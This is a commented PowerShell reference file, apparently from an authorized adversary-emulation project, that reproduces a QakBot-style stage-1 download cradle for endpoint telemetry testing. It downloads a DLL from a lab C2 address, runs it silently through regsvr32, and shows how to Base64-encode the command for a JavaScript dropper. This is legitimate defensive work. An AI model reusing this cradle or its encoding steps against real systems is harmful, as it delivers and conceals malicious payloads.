# ============================================================================
# ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
#
# This code replicates documented malware behavior for defensive security
# testing and endpoint telemetry validation. It does NOT contain real malware
# payloads, exploits, or evasion techniques.
#
# LEGAL: Only run this in environments you own or have explicit written
# authorization to test. Unauthorized use may violate computer fraud laws.
#
# Final payload: calc.exe (safe, benign)
# C2: Local network only (hardcoded private IP: 192.168.0.148)
# ============================================================================
#
# JawDropper Stage 1 — PowerShell Download Cradle (Reference)
#
# This file shows the DECODED version of the PowerShell command embedded in
# dropper.js. It is NOT executed directly — it exists for documentation.
#
# MITRE ATT&CK Techniques:
#   T1059.001 — Command and Scripting Interpreter: PowerShell
#   T1105    — Ingress Tool Transfer
#   T1218.010 — Signed Binary Proxy Execution: Regsvr32
#
# Emulates: QakBot BB27/BB28 PowerShell download cradle
# Reference: CISA AA23-242A
#
# ============================================================================

# C2 server address (hardcoded private IP — safety mechanism)
# This is the developer's MacBook on the lab network
$c2 = "http://192.168.0.148:8888"

# Download destination — standard temp directory
# MITRE: T1105 - Ingress Tool Transfer
$outPath = "$env:TEMP\update.dll"

# Download the stage 2 DLL from the C2 server
# MITRE: T1105 - Ingress Tool Transfer
# Uses Invoke-WebRequest (PowerShell 3.0+)
Invoke-WebRequest -Uri "$c2/payloads/payload.dll" -OutFile $outPath

# Execute the DLL via regsvr32 (silent mode)
# MITRE: T1218.010 - Signed Binary Proxy Execution: Regsvr32
#
# Why regsvr32?
#   - It's a signed Microsoft binary (proxy execution)
#   - The /s flag suppresses dialog boxes
#   - Calls DllRegisterServer export in the DLL
#   - Common QakBot execution technique per CISA AA23-242A
Start-Process "regsvr32.exe" -ArgumentList "/s $outPath"

# ============================================================================
# How to encode this for dropper.js:
# ============================================================================
#
# PowerShell's -encodedcommand parameter requires UTF-16LE Base64 encoding.
#
# Method 1 — PowerShell:
#   $command = Get-Content .\encoded_command.ps1 -Raw
#   $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
#   $encoded = [Convert]::ToBase64String($bytes)
#   Write-Output $encoded
#
# Method 2 — One-liner (for the actual download cradle only):
#   $cmd = '$c2 = "http://192.168.0.148:8888"
#   $outPath = "$env:TEMP\update.dll"
#   Invoke-WebRequest -Uri "$c2/payloads/payload.dll" -OutFile $outPath
#   Start-Process "regsvr32.exe" -ArgumentList "/s $outPath"'
#   [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
#
# ============================================================================
# How to decode the embedded command:
# ============================================================================
#
# $encoded = "<base64 string from dropper.js>"
# [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
#
# ============================================================================
